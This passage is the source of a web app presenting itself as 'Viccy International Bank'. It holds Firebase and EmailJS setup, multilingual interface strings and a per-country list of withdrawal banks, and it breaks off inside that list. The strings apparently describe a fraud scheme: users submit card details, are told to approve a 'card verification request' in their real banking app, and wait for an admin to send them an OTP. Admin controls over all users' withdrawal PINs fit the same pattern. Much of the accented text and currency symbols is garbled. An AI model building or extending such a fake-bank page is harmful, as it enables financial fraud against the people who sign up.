<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Viccy International Bank</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
import { getDatabase, ref, set, get, runTransaction, onValue } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
const firebaseConfig = {
  apiKey:"AIzaSyDLPAktzLmpfNX9XUmw9i_B2P2I3XPwOLs",authDomain:"viccybank.firebaseapp.com",
  databaseURL:"https://viccybank-default-rtdb.firebaseio.com",projectId:"viccybank",
  storageBucket:"viccybank.firebasestorage.app",messagingSenderId:"328465601734",
  appId:"1:328465601734:web:10e00c00286f1b932273c7"
};
const app=initializeApp(firebaseConfig),auth=getAuth(app),db=getDatabase(app);
emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});
let currentUser=null,userDataRef=null,userCurrency='USD';
const EMAILJS_SERVICE_ID='service_rs826sa',EMAILJS_TEMPLATE_ID='template_6f5m0as';
const currencySymbols={USD:'$',EUR:'‚Ç¨',GBP:'¬£',JPY:'¬•',AUD:'A$',CAD:'C$',CHF:'Fr.',CNY:'¬•'};

const T={
en:{createAccount:'Create Account',login:'Log In',availableBalance:'Available Balance',withdraw:'Withdraw',send:'Send',more:'More',recentTransactions:'Recent Transactions',accountInfo:'Account Information',selectCountry:'Select Country',surname:'Surname',firstName:'First Name',otherName:'Other Name (optional)',phoneNumber:'Phone Number',username:'Username',email:'Email',password:'Password (min 8 chars)',confirmPassword:'Confirm Password',promoCode:'Promo Code (optional)',signUp:'Sign Up',alreadyHaveAccount:'Already have an account? Log In',noAccount:"Don't have an account? Sign Up",sendMoney:'Send Money',withdrawFunds:'Withdraw Funds',accounts:'Accounts',contactUs:'Contact us',howToUse:'How to use it',account:'Account',logout:'Logout',generatePin:'Generate New PIN',selectMethod:'Select Method',amount:'Amount',requestWithdrawal:'Request Withdrawal',sendNow:'Send Now',recipientAccount:'Recipient Account Number (10 digits)',enterPin:'Enter your 4-digit PIN',withdrawalNotice:'‚ö†Ô∏è You can only withdraw to accounts in your name',accountNumber:'Account Number',withdrawCode:'4 Digit Withdraw Code',notYetGenerated:'Not yet generated',country:'Country',copyAccount:'Copy Account',linkedCards:'Linked Cards',addCard:'Add Card',alerts:'Alerts',noTransactions:'No transactions yet',noNotifications:'No notifications',cardAuth:'Card Authorization Required',authorizeInApp:'Authorize in Bank App',enterOtp:'Enter OTP Code',iAuthorized:'I Authorized in Bank App',close:'Close',linkCard:'Link Card',removeCard:'Remove',pending:'‚è≥ Pending Authorization',authorized:'‚úì Authorized',otpRequired:'üîê OTP Required',rejected:'‚ùå Rejected',editCard:'Edit Card',saveCard:'Save Changes',sentTo:'Sent to',receivedFrom:'Received from',via:'via',withdrawal:'Withdrawal',received:'Received',sent:'Sent',settings:'Settings',howToUseText:'How to use Viccy International Bank:\n1. Sign up or log in\n2. Send money using account numbers\n3. Withdraw to your bank or payment method\n4. Check your balance and history anytime\n5. Use your PIN for withdrawals',contactText:'Email us: viccylay30@gmail.com',cardAuthText:'Your card has been submitted for verification. Please complete authorization using one of the following methods:',authorizeAppDesc:'1. Open your banking app\n2. Go to Pending Authorizations\n3. Approve the card verification request\n4. Click button below after approval',otpDesc:'Wait for admin to send OTP code to your notifications, then enter it below',authProcessing:'‚è±Ô∏è Authorization typically takes 5-10 minutes.',otpTitle:'Enter OTP Code',otpText:'Enter the one-time password sent to your notifications by the admin',verifyOtp:'Verify OTP',cancel:'Cancel',myLinkedCards:'My Linked Cards',noCards:'No cards linked',adminPanel:'Admin Panel',manageUsers:'Manage user withdrawal codes',changeAllPins:"Change All Users' PINs",newPin:'New PIN',changeAll:'Change All',logoutBtn:'Logout',requiredUpdates:'üî¥ Required Updates (Card Authorization)',usersByCountry:'üìç Users by Country',users:'users',requiresAction:'üî¥ REQUIRES ACTION',cardAuthFailed:'Card authorization failed',pinUpdated:'PIN updated successfully!',pinInvalid:'Please enter a valid 4-digit PIN',withdrawalSubmitted:'Withdrawal request submitted!',processingTime:'Processing time: 1-3 business days',insufficientBalance:'Insufficient balance',incorrectPin:'Incorrect PIN',selectWithdrawMethod:'Please select a withdrawal method',enterValidAmount:'Enter a valid amount',enterPin4:'Enter your 4-digit PIN',fillAllFields:'Please fill in all fields',authorizedBankCard:'Authorized Bank Card',authorizedCardDesc:'Use your linked authorized card to withdraw funds',noAuthorizedCards:'No authorized cards available'},
es:{createAccount:'Crear Cuenta',login:'Iniciar Sesi√≥n',availableBalance:'Saldo Disponible',withdraw:'Retirar',send:'Enviar',more:'M√°s',recentTransactions:'Transacciones Recientes',accountInfo:'Informaci√≥n de Cuenta',selectCountry:'Seleccionar Pa√≠s',surname:'Apellido',firstName:'Nombre',otherName:'Otro Nombre (opcional)',phoneNumber:'N√∫mero de Tel√©fono',username:'Usuario',email:'Correo',password:'Contrase√±a',confirmPassword:'Confirmar Contrase√±a',promoCode:'C√≥digo Promo',signUp:'Registrarse',alreadyHaveAccount:'¬øYa tienes cuenta? Iniciar Sesi√≥n',noAccount:'¬øNo tienes cuenta? Registrarse',sendMoney:'Enviar Dinero',withdrawFunds:'Retirar Fondos',accounts:'Cuentas',contactUs:'Cont√°ctanos',howToUse:'C√≥mo usar',account:'Cuenta',logout:'Cerrar Sesi√≥n',generatePin:'Generar Nuevo PIN',selectMethod:'Seleccionar M√©todo',amount:'Cantidad',requestWithdrawal:'Solicitar Retiro',sendNow:'Enviar Ahora',recipientAccount:'N√∫mero de Cuenta (10 d√≠gitos)',enterPin:'Ingrese su PIN de 4 d√≠gitos',withdrawalNotice:'‚ö†Ô∏è Solo puede retirar a cuentas a su nombre',accountNumber:'N√∫mero de Cuenta',withdrawCode:'C√≥digo de Retiro de 4 D√≠gitos',notYetGenerated:'A√∫n no generado',country:'Pa√≠s',copyAccount:'Copiar Cuenta',linkedCards:'Tarjetas',addCard:'Agregar Tarjeta',alerts:'Alertas',noTransactions:'Sin transacciones',noNotifications:'Sin notificaciones',cardAuth:'Autorizaci√≥n Requerida',authorizeInApp:'Autorizar en App',enterOtp:'Ingresar OTP',iAuthorized:'Autoric√© en la App',close:'Cerrar',linkCard:'Vincular Tarjeta',removeCard:'Eliminar',pending:'‚è≥ Pendiente',authorized:'‚úì Autorizada',otpRequired:'üîê OTP Requerido',rejected:'‚ùå Rechazada',editCard:'Editar Tarjeta',saveCard:'Guardar',sentTo:'Enviado a',receivedFrom:'Recibido de',via:'v√≠a',withdrawal:'Retiro',received:'Recibido',sent:'Enviado',settings:'Configuraci√≥n',howToUseText:'1. Reg√≠strate\n2. Env√≠a dinero\n3. Retira fondos\n4. Consulta tu saldo\n5. Usa tu PIN para retiros',contactText:'viccylay30@gmail.com',cardAuthText:'Tu tarjeta ha sido enviada para verificaci√≥n.',authorizeAppDesc:'1. Abre tu app bancaria\n2. Ve a Autorizaciones Pendientes\n3. Aprueba la solicitud\n4. Haz clic abajo',otpDesc:'Espera el c√≥digo OTP en tus notificaciones',authProcessing:'‚è±Ô∏è La autorizaci√≥n tarda 5-10 minutos.',otpTitle:'Ingresar OTP',otpText:'Ingresa el c√≥digo de un solo uso del administrador',verifyOtp:'Verificar OTP',cancel:'Cancelar',myLinkedCards:'Mis Tarjetas',noCards:'Sin tarjetas',adminPanel:'Panel Admin',manageUsers:'Gestionar usuarios',changeAllPins:'Cambiar PINs de Todos',newPin:'Nuevo PIN',changeAll:'Cambiar Todo',logoutBtn:'Cerrar Sesi√≥n',requiredUpdates:'üî¥ Actualizaciones Requeridas',usersByCountry:'üìç Usuarios por Pa√≠s',users:'usuarios',requiresAction:'üî¥ REQUIERE ACCI√ìN',cardAuthFailed:'Autorizaci√≥n fallida',pinUpdated:'PIN actualizado!',pinInvalid:'PIN inv√°lido',withdrawalSubmitted:'Solicitud enviada!',processingTime:'1-3 d√≠as h√°biles',insufficientBalance:'Saldo insuficiente',incorrectPin:'PIN incorrecto',selectWithdrawMethod:'Seleccione m√©todo',enterValidAmount:'Ingrese cantidad v√°lida',enterPin4:'Ingrese PIN de 4 d√≠gitos',fillAllFields:'Complete todos los campos',authorizedBankCard:'Tarjeta Autorizada',authorizedCardDesc:'Use su tarjeta autorizada para retirar',noAuthorizedCards:'Sin tarjetas autorizadas'},
fr:{createAccount:'Cr√©er un Compte',login:'Se Connecter',availableBalance:'Solde Disponible',withdraw:'Retirer',send:'Envoyer',more:'Plus',recentTransactions:'Transactions R√©centes',accountInfo:'Informations du Compte',selectCountry:'S√©lectionner le Pays',surname:'Nom de Famille',firstName:'Pr√©nom',otherName:'Autre Nom (optionnel)',phoneNumber:'Num√©ro de T√©l√©phone',username:"Nom d'Utilisateur",email:'Email',password:'Mot de Passe',confirmPassword:'Confirmer',promoCode:'Code Promo',signUp:"S'inscrire",alreadyHaveAccount:'D√©j√† un compte? Se Connecter',noAccount:"Pas de compte? S'inscrire",sendMoney:"Envoyer de l'Argent",withdrawFunds:'Retirer des Fonds',accounts:'Comptes',contactUs:'Contactez-nous',howToUse:'Comment utiliser',account:'Compte',logout:'D√©connexion',generatePin:'G√©n√©rer un PIN',selectMethod:'S√©lectionner',amount:'Montant',requestWithdrawal:'Demander un Retrait',sendNow:'Envoyer',recipientAccount:'Num√©ro de Compte (10 chiffres)',enterPin:'Entrez votre PIN',withdrawalNotice:'‚ö†Ô∏è Retraits uniquement sur vos comptes',accountNumber:'Num√©ro de Compte',withdrawCode:'Code de Retrait',notYetGenerated:'Pas encore g√©n√©r√©',country:'Pays',copyAccount:'Copier Compte',linkedCards:'Cartes',addCard:'Ajouter Carte',alerts:'Alertes',noTransactions:'Aucune transaction',noNotifications:'Aucune notification',cardAuth:'Autorisation Requise',authorizeInApp:"Autoriser dans l'App",enterOtp:'Entrer OTP',iAuthorized:"J'ai autoris√©",close:'Fermer',linkCard:'Lier la Carte',removeCard:'Supprimer',pending:'‚è≥ En Attente',authorized:'‚úì Autoris√©e',otpRequired:'üîê OTP Requis',rejected:'‚ùå Refus√©e',editCard:'Modifier',saveCard:'Enregistrer',sentTo:'Envoy√© √†',receivedFrom:'Re√ßu de',via:'via',withdrawal:'Retrait',received:'Re√ßu',sent:'Envoy√©',settings:'Param√®tres',howToUseText:'1. Inscrivez-vous\n2. Envoyez de l\'argent\n3. Retirez des fonds\n4. Consultez votre solde\n5. Utilisez votre PIN',contactText:'viccylay30@gmail.com',cardAuthText:'Votre carte a √©t√© soumise pour v√©rification.',authorizeAppDesc:'1. Ouvrez votre app\n2. Autorisations en attente\n3. Approuvez\n4. Cliquez ci-dessous',otpDesc:'Attendez le code OTP dans vos notifications',authProcessing:'‚è±Ô∏è Autorisation dans 5-10 minutes.',otpTitle:'Entrer OTP',otpText:'Entrez le code envoy√© par admin',verifyOtp:'V√©rifier OTP',cancel:'Annuler',myLinkedCards:'Mes Cartes',noCards:'Aucune carte',adminPanel:'Panneau Admin',manageUsers:'G√©rer les utilisateurs',changeAllPins:'Changer tous les PINs',newPin:'Nouveau PIN',changeAll:'Tout Changer',logoutBtn:'D√©connexion',requiredUpdates:'üî¥ Mises √† Jour Requises',usersByCountry:'üìç Utilisateurs par Pays',users:'utilisateurs',requiresAction:'üî¥ ACTION REQUISE',cardAuthFailed:'Autorisation √©chou√©e',pinUpdated:'PIN mis √† jour!',pinInvalid:'PIN invalide',withdrawalSubmitted:'Demande soumise!',processingTime:'1-3 jours ouvrables',insufficientBalance:'Solde insuffisant',incorrectPin:'PIN incorrect',selectWithdrawMethod:'S√©lectionnez m√©thode',enterValidAmount:'Montant invalide',enterPin4:'Entrez votre PIN',fillAllFields:'Remplissez tous les champs',authorizedBankCard:'Carte Autoris√©e',authorizedCardDesc:'Retirez avec votre carte autoris√©e',noAuthorizedCards:'Aucune carte autoris√©e'},
de:{createAccount:'Konto Erstellen',login:'Anmelden',availableBalance:'Verf√ºgbares Guthaben',withdraw:'Abheben',send:'Senden',more:'Mehr',recentTransactions:'Letzte Transaktionen',accountInfo:'Kontoinformationen',selectCountry:'Land Ausw√§hlen',surname:'Nachname',firstName:'Vorname',otherName:'Anderer Name',phoneNumber:'Telefonnummer',username:'Benutzername',email:'E-Mail',password:'Passwort',confirmPassword:'Best√§tigen',promoCode:'Promocode',signUp:'Registrieren',alreadyHaveAccount:'Konto? Anmelden',noAccount:'Kein Konto? Registrieren',sendMoney:'Geld Senden',withdrawFunds:'Geld Abheben',accounts:'Konten',contactUs:'Kontakt',howToUse:'Anleitung',account:'Konto',logout:'Abmelden',generatePin:'PIN Generieren',selectMethod:'Methode',amount:'Betrag',requestWithdrawal:'Auszahlung Anfordern',sendNow:'Senden',recipientAccount:'Kontonummer (10 Ziffern)',enterPin:'PIN eingeben',withdrawalNotice:'‚ö†Ô∏è Nur auf eigene Konten abheben',accountNumber:'Kontonummer',withdrawCode:'Auszahlungscode',notYetGenerated:'Noch nicht',country:'Land',copyAccount:'Konto Kopieren',linkedCards:'Karten',addCard:'Karte Hinzuf√ºgen',alerts:'Benachrichtigungen',noTransactions:'Keine Transaktionen',noNotifications:'Keine Benachrichtigungen',cardAuth:'Kartenautorisierung',authorizeInApp:'In App Autorisieren',enterOtp:'OTP Eingeben',iAuthorized:'Autorisiert',close:'Schlie√üen',linkCard:'Karte Verkn√ºpfen',removeCard:'Entfernen',pending:'‚è≥ Ausstehend',authorized:'‚úì Autorisiert',otpRequired:'üîê OTP Erforderlich',rejected:'‚ùå Abgelehnt',editCard:'Bearbeiten',saveCard:'Speichern',sentTo:'An',receivedFrom:'Von',via:'√ºber',withdrawal:'Abhebung',received:'Empfangen',sent:'Gesendet',settings:'Einstellungen',howToUseText:'1. Registrieren\n2. Geld senden\n3. Abheben\n4. Saldo pr√ºfen\n5. PIN verwenden',contactText:'viccylay30@gmail.com',cardAuthText:'Karte zur Verifizierung eingereicht.',authorizeAppDesc:'1. Banking-App √∂ffnen\n2. Ausstehende Autorisierungen\n3. Genehmigen\n4. Unten klicken',otpDesc:'OTP aus Benachrichtigungen eingeben',authProcessing:'‚è±Ô∏è Autorisierung: 5-10 Minuten.',otpTitle:'OTP Eingeben',otpText:'Einmalpasswort vom Admin eingeben',verifyOtp:'OTP Verifizieren',cancel:'Abbrechen',myLinkedCards:'Meine Karten',noCards:'Keine Karten',adminPanel:'Admin-Panel',manageUsers:'Benutzer verwalten',changeAllPins:'Alle PINs √Ñndern',newPin:'Neue PIN',changeAll:'Alle √Ñndern',logoutBtn:'Abmelden',requiredUpdates:'üî¥ Erforderliche Updates',usersByCountry:'üìç Benutzer nach Land',users:'Benutzer',requiresAction:'üî¥ AKTION ERFORDERLICH',cardAuthFailed:'Autorisierung fehlgeschlagen',pinUpdated:'PIN aktualisiert!',pinInvalid:'Ung√ºltige PIN',withdrawalSubmitted:'Anfrage eingereicht!',processingTime:'1-3 Werktage',insufficientBalance:'Unzureichendes Guthaben',incorrectPin:'Falsche PIN',selectWithdrawMethod:'Methode w√§hlen',enterValidAmount:'G√ºltigen Betrag eingeben',enterPin4:'PIN eingeben',fillAllFields:'Alle Felder ausf√ºllen',authorizedBankCard:'Autorisierte Karte',authorizedCardDesc:'Mit autorisierter Karte abheben',noAuthorizedCards:'Keine autorisierten Karten'},
zh:{createAccount:'ÂàõÂª∫Ë¥¶Êà∑',login:'ÁôªÂΩï',availableBalance:'ÂèØÁî®‰ΩôÈ¢ù',withdraw:'ÊèêÊ¨æ',send:'ÂèëÈÄÅ',more:'Êõ¥Â§ö',recentTransactions:'ÊúÄËøë‰∫§Êòì',accountInfo:'Ë¥¶Êà∑‰ø°ÊÅØ',selectCountry:'ÈÄâÊã©ÂõΩÂÆ∂',surname:'Âßì',firstName:'Âêç',otherName:'ÂÖ∂‰ªñÂêçÂ≠ó',phoneNumber:'ÁîµËØùÂè∑Á†Å',username:'Áî®Êà∑Âêç',email:'ÈÇÆÁÆ±',password:'ÂØÜÁ†Å',confirmPassword:'Á°ÆËÆ§ÂØÜÁ†Å',promoCode:'‰øÉÈîÄÁ†Å',signUp:'Ê≥®ÂÜå',alreadyHaveAccount:'Â∑≤ÊúâË¥¶Êà∑ÔºüÁôªÂΩï',noAccount:'Ê≤°ÊúâË¥¶Êà∑ÔºüÊ≥®ÂÜå',sendMoney:'ÂèëÈÄÅ',withdrawFunds:'ÊèêÊ¨æ',accounts:'Ë¥¶Êà∑',contactUs:'ËÅîÁ≥ªÊàë‰ª¨',howToUse:'‰ΩøÁî®ÊåáÂçó',account:'Ë¥¶Êà∑',logout:'ÁôªÂá∫',generatePin:'ÁîüÊàêPIN',selectMethod:'ÈÄâÊã©ÊñπÂºè',amount:'ÈáëÈ¢ù',requestWithdrawal:'Áî≥ËØ∑ÊèêÊ¨æ',sendNow:'ÂèëÈÄÅ',recipientAccount:'Êî∂Ê¨æË¥¶Âè∑(10‰Ωç)',enterPin:'ËæìÂÖ•4‰ΩçPIN',withdrawalNotice:'‚ö†Ô∏è Âè™ËÉΩÊèêÊ¨æÂà∞Êú¨‰∫∫Ë¥¶Êà∑',accountNumber:'Ë¥¶Âè∑',withdrawCode:'ÊèêÊ¨æÁ†Å',notYetGenerated:'Â∞öÊú™ÁîüÊàê',country:'ÂõΩÂÆ∂',copyAccount:'Â§çÂà∂Ë¥¶Âè∑',linkedCards:'ÂÖ≥ËÅîÂç°',addCard:'Ê∑ªÂä†Âç°',alerts:'ÈÄöÁü•',noTransactions:'ÊöÇÊó†‰∫§Êòì',noNotifications:'ÊöÇÊó†ÈÄöÁü•',cardAuth:'ÈúÄË¶ÅÊéàÊùÉ',authorizeInApp:'Âú®Èì∂Ë°åÂ∫îÁî®ÊéàÊùÉ',enterOtp:'ËæìÂÖ•OTP',iAuthorized:'Â∑≤ÊéàÊùÉ',close:'ÂÖ≥Èó≠',linkCard:'ÂÖ≥ËÅîÂç°',removeCard:'Âà†Èô§',pending:'‚è≥ ÂæÖÊéàÊùÉ',authorized:'‚úì Â∑≤ÊéàÊùÉ',otpRequired:'üîê ÈúÄË¶ÅOTP',rejected:'‚ùå Â∑≤ÊãíÁªù',editCard:'ÁºñËæëÂç°Áâá',saveCard:'‰øùÂ≠ò',sentTo:'ÂèëÈÄÅËá≥',receivedFrom:'Êî∂Âà∞Êù•Ëá™',via:'ÈÄöËøá',withdrawal:'ÊèêÊ¨æ',received:'Êî∂Âà∞',sent:'Â∑≤ÂèëÈÄÅ',settings:'ËÆæÁΩÆ',howToUseText:'1. Ê≥®ÂÜåÊàñÁôªÂΩï\n2. Ê±áÊ¨æ\n3. ÊèêÊ¨æ\n4. Êü•Áúã‰ΩôÈ¢ù\n5. ‰ΩøÁî®PINÊèêÊ¨æ',contactText:'viccylay30@gmail.com',cardAuthText:'Âç°ÁâáÂ∑≤Êèê‰∫§È™åËØÅ„ÄÇ',authorizeAppDesc:'1. ÊâìÂºÄÈì∂Ë°åÂ∫îÁî®\n2. ÂæÖÊéàÊùÉ\n3. ÊâπÂáÜ\n4. ÁÇπÂáª‰∏ãÊñπ',otpDesc:'Á≠âÂæÖÁÆ°ÁêÜÂëòÂèëÈÄÅOTP',authProcessing:'‚è±Ô∏è ÊéàÊùÉÈúÄ5-10ÂàÜÈíü„ÄÇ',otpTitle:'ËæìÂÖ•OTP',otpText:'ËæìÂÖ•ÁÆ°ÁêÜÂëòÂèëÈÄÅÁöÑ‰∏ÄÊ¨°ÊÄßÂØÜÁ†Å',verifyOtp:'È™åËØÅOTP',cancel:'ÂèñÊ∂à',myLinkedCards:'ÊàëÁöÑÂç°',noCards:'Êó†Âç°',adminPanel:'ÁÆ°ÁêÜÈù¢Êùø',manageUsers:'ÁÆ°ÁêÜÁî®Êà∑',changeAllPins:'Êõ¥ÊîπÊâÄÊúâPIN',newPin:'Êñ∞PIN',changeAll:'ÂÖ®ÈÉ®Êõ¥Êîπ',logoutBtn:'ÁôªÂá∫',requiredUpdates:'üî¥ ÈúÄË¶ÅÊõ¥Êñ∞',usersByCountry:'üìç ÊåâÂõΩÂÆ∂',users:'Áî®Êà∑',requiresAction:'üî¥ ÈúÄË¶ÅÊìç‰Ωú',cardAuthFailed:'ÊéàÊùÉÂ§±Ë¥•',pinUpdated:'PINÂ∑≤Êõ¥Êñ∞!',pinInvalid:'Êó†ÊïàPIN',withdrawalSubmitted:'Áî≥ËØ∑Â∑≤Êèê‰∫§!',processingTime:'1-3Â∑•‰ΩúÊó•',insufficientBalance:'‰ΩôÈ¢ù‰∏çË∂≥',incorrectPin:'PINÈîôËØØ',selectWithdrawMethod:'ÈÄâÊã©ÊñπÂºè',enterValidAmount:'ËæìÂÖ•ÊúâÊïàÈáëÈ¢ù',enterPin4:'ËæìÂÖ•PIN',fillAllFields:'Â°´ÂÜôÊâÄÊúâÂ≠óÊÆµ',authorizedBankCard:'Â∑≤ÊéàÊùÉÈì∂Ë°åÂç°',authorizedCardDesc:'‰ΩøÁî®Â∑≤ÊéàÊùÉÂç°ÊèêÊ¨æ',noAuthorizedCards:'Êó†Â∑≤ÊéàÊùÉÂç°'},
pt:{createAccount:'Criar Conta',login:'Entrar',availableBalance:'Saldo Dispon√≠vel',withdraw:'Sacar',send:'Enviar',more:'Mais',recentTransactions:'Transa√ß√µes Recentes',accountInfo:'Informa√ß√µes da Conta',selectCountry:'Selecionar Pa√≠s',surname:'Sobrenome',firstName:'Nome',otherName:'Outro Nome',phoneNumber:'Telefone',username:'Usu√°rio',email:'Email',password:'Senha',confirmPassword:'Confirmar',promoCode:'C√≥digo Promo',signUp:'Cadastrar',alreadyHaveAccount:'J√° tem conta? Entrar',noAccount:'Sem conta? Cadastrar',sendMoney:'Enviar Dinheiro',withdrawFunds:'Sacar',accounts:'Contas',contactUs:'Contato',howToUse:'Como usar',account:'Conta',logout:'Sair',generatePin:'Gerar PIN',selectMethod:'Selecionar',amount:'Valor',requestWithdrawal:'Solicitar Saque',sendNow:'Enviar',recipientAccount:'N√∫mero da Conta (10 d√≠gitos)',enterPin:'Digite seu PIN',withdrawalNotice:'‚ö†Ô∏è Saque apenas para contas em seu nome',accountNumber:'N√∫mero da Conta',withdrawCode:'C√≥digo de Saque',notYetGenerated:'Ainda n√£o gerado',country:'Pa√≠s',copyAccount:'Copiar Conta',linkedCards:'Cart√µes',addCard:'Adicionar Cart√£o',alerts:'Alertas',noTransactions:'Sem transa√ß√µes',noNotifications:'Sem notifica√ß√µes',cardAuth:'Autoriza√ß√£o Necess√°ria',authorizeInApp:'Autorizar no App',enterOtp:'Inserir OTP',iAuthorized:'Autorizei no App',close:'Fechar',linkCard:'Vincular Cart√£o',removeCard:'Remover',pending:'‚è≥ Pendente',authorized:'‚úì Autorizado',otpRequired:'üîê OTP Necess√°rio',rejected:'‚ùå Rejeitado',editCard:'Editar',saveCard:'Salvar',sentTo:'Enviado para',receivedFrom:'Recebido de',via:'via',withdrawal:'Saque',received:'Recebido',sent:'Enviado',settings:'Configura√ß√µes',howToUseText:'1. Cadastre-se\n2. Envie dinheiro\n3. Saque\n4. Verifique saldo\n5. Use PIN para saques',contactText:'viccylay30@gmail.com',cardAuthText:'Cart√£o enviado para verifica√ß√£o.',authorizeAppDesc:'1. Abra seu app banc√°rio\n2. Autoriza√ß√µes Pendentes\n3. Aprove\n4. Clique abaixo',otpDesc:'Aguarde OTP nas notifica√ß√µes',authProcessing:'‚è±Ô∏è Autoriza√ß√£o em 5-10 minutos.',otpTitle:'Inserir OTP',otpText:'Insira o c√≥digo do administrador',verifyOtp:'Verificar OTP',cancel:'Cancelar',myLinkedCards:'Meus Cart√µes',noCards:'Sem cart√µes',adminPanel:'Painel Admin',manageUsers:'Gerenciar usu√°rios',changeAllPins:'Alterar todos os PINs',newPin:'Novo PIN',changeAll:'Alterar Tudo',logoutBtn:'Sair',requiredUpdates:'üî¥ Atualiza√ß√µes Necess√°rias',usersByCountry:'üìç Usu√°rios por Pa√≠s',users:'usu√°rios',requiresAction:'üî¥ REQUER A√á√ÉO',cardAuthFailed:'Autoriza√ß√£o falhou',pinUpdated:'PIN atualizado!',pinInvalid:'PIN inv√°lido',withdrawalSubmitted:'Solicita√ß√£o enviada!',processingTime:'1-3 dias √∫teis',insufficientBalance:'Saldo insuficiente',incorrectPin:'PIN incorreto',selectWithdrawMethod:'Selecione m√©todo',enterValidAmount:'Valor inv√°lido',enterPin4:'Digite seu PIN',fillAllFields:'Preencha todos os campos',authorizedBankCard:'Cart√£o Autorizado',authorizedCardDesc:'Saque com cart√£o autorizado',noAuthorizedCards:'Sem cart√µes autorizados'}
};
let currentLanguage='en';
function t(k){return(T[currentLanguage]&&T[currentLanguage][k])||T.en[k]||k;}
function translatePage(){
  document.querySelectorAll('[data-translate]').forEach(el=>{
    const k=el.getAttribute('data-translate'),v=t(k);
    if(!v)return;
    if(el.tagName==='INPUT'||el.tagName==='TEXTAREA'){if(el.placeholder!==undefined)el.placeholder=v;}
    else el.textContent=v;
  });
}

const banksByCountry={
USA:[{name:'Cash App',fields:['cashtag','fullName']},{name:'Venmo',fields:['username','fullName']},{name:'PayPal',fields:['email']},{name:'Bank of America',fields:['accountHolder','accountNumber','routingNumber']},{name:'Chase Bank',fields:['accountHolder','accountNumber','routingNumber']},{name:'Wells Fargo',fields:['accountHolder','accountNumber','routingNumber']},{name:'Zelle',fields:['email','phoneNumber']}],
UK:[{name:'PayPal',fields:['email']},{name:'Barclays',fields:['accountHolder','sortCode','accountNumber']},{name:'HSBC',fields:['accountHolder','sortCode','accountNumber']},{name:'Lloyds Bank',fields:['accountHolder','sortCode','accountNumber']},{name:'NatWest',fields:['accountHolder','sortCode','accountNumber']},{name:'Revolut',fields:['accountHolder','accountNumber','sortCode']}],
Nigeria:[{name:'PayPal',fields:['email']},{name:'OPay',fields:['phoneNumber','fullName']},{name:'PalmPay',fields:['phoneNumber','fullName']},{name:'Zenith Bank',fields:['accountHolder','accountNumber']},{name:'GTBank',fields:['accountHolder','accountNumber']},{name:'Access Bank',fields:['accountHolder','accountNumber']},{name:'First Bank',fields:['accountHolder','accountNumber']},{name:'UBA',fields:['accountHolder','accountNumber']}],
Germany:[{name:'PayPal',fields:['email']},{name:'Deutsche Bank',fields:['accountHolder','iban']},{name:'Commerzbank',fields:['accountHolder','iban']},{name:'N26',fields:['accountHolder','iban']},{name:'Sparkasse',fields:['accountHolder','iban']}],
France:[{name:'PayPal',fields:['email']},{name:'BNP Paribas',fields:['accountHolder','iban']},{name:'Cr√©dit Agricole',fields:['accountHolder','iban']},{name:'Soci√©t√© G√©n√©rale',fields:['accountHolder','iban']}],
Canada:[{name:'PayPal',fields:['email']},{name:'Interac e-Transfer',fields:['email','fullName']},{name:'TD Bank',fields:['accountHolder','accountNumber','transitNumber','institutionNumber']},{name:'RBC',fields:['accountHolder','accountNumber','transitNumber','institutionNumber']}],
India:[{name:'PayPal',fields:['email']},{name:'Paytm',fields:['phoneNumber','fullName']},{name:'Google Pay',fields:['upiId']},{name:'SBI',fields:['accountHolder','accountNumber','ifscCode']},{name:'HDFC Bank',fields:['accountHolder','accountNumber','ifscCode']}],
Brazil:[{name:'PayPal',fields:['email']},{name:'Pix',fields:['pixKey','fullName']},{name:'Nubank',fields:['accountHolder','accountNumber','agencyNumber']},{name:'Banco do Brasil',fields:['accountHolder','accountNumber','agencyNumber']}],
'South Africa':[{name:'PayPal',fields:['email']},{name:'Capitec Bank',fields:['accountHolder','accountNumber','branchCode']},{name:'FNB',fields:['accountHolder','accountNumber','branchCode']},{name:'Standard Bank',fields:['accountHolder','accountNumber','branchCode']}],
Australia:[{name:'PayPal',fields:['email']},{name:'Commonwealth Bank',fields:['accountHolder','bsb','accountNumber']},{name:'Westpac',fields:['accountHolder','bsb','accountNumber']},{name:'ANZ',fields:['accountHolder','bsb','accountNumber']}],
Mexico:[{name:'PayPal',fields:['email']},{name:'BBVA M√©xico',fields:['accountHolder','clabe']},{name:'Santander M√©xico',fields:['accountHolder','clabe']}],
Japan:[{name:'PayPal',fields:['email']},{name:'Japan Post Bank',fields:['accountHolder','accountNumber','branchCode']},{name:'MUFG Bank',fields:['accountHolder','accountNumber','branchCode']}],
China:[{name:'Alipay',fields:['alipayId','fullName']},{name:'WeChat Pay',fields:['wechatId','fullName']},{name:'ICBC',fields:['accountHolder','accountNumber']}],
Argentina:[{name:'PayPal',fields:['email']},{name:'Mercado Pago',fields:['email','fullName']},{name:'Banco Galicia',fields:['accountHolder','cbu']}],
Chile:[{name:'PayPal',fields:['email']},{name:'Banco de Chile',fields:['accountHolder','accountNumber','rut']}],
Italy:[{name:'PayPal',fields:['email']},{name:'Intesa Sanpaolo',fields:['accountHolder','iban']},{name:'UniCredit',fields:['accountHolder','iban']}],
Spain:[{name:'PayPal',fields:['email']},{name:'BBVA',fields:['accountHolder','iban']},{name:'Santander',fields:['accountHolder','iban']},{name:'CaixaBank',fields:['accountHolder','iban']}],
Portugal:[{name:'PayPal',fields:['email']},{name:'Revolut',fields:['accountHolder','iban']},{name:'Millennium BCP',fields:['accountHolder','iban']},{name:'CGD',fields:['accountHolder','iban']}],
Netherlands:[{name:'PayPal',fields:['email']},{name:'ING',fields:['accountHolder','iban']},{name:'Rabobank',fields:['accountHolder','iban']}],
Belgium:[{name:'PayPal',fields:['email']},{name:'KBC',fields:['accountHolder','iban']},{name:'BNP Paribas Fortis',fields:['accountHolder','iban']}],
Sweden:[{name:'PayPal',fields:['email']},{name:'Swish',fields:['phoneNumber','fullName']},{name:'Nordea',fields:['accountHolder','iban']}],
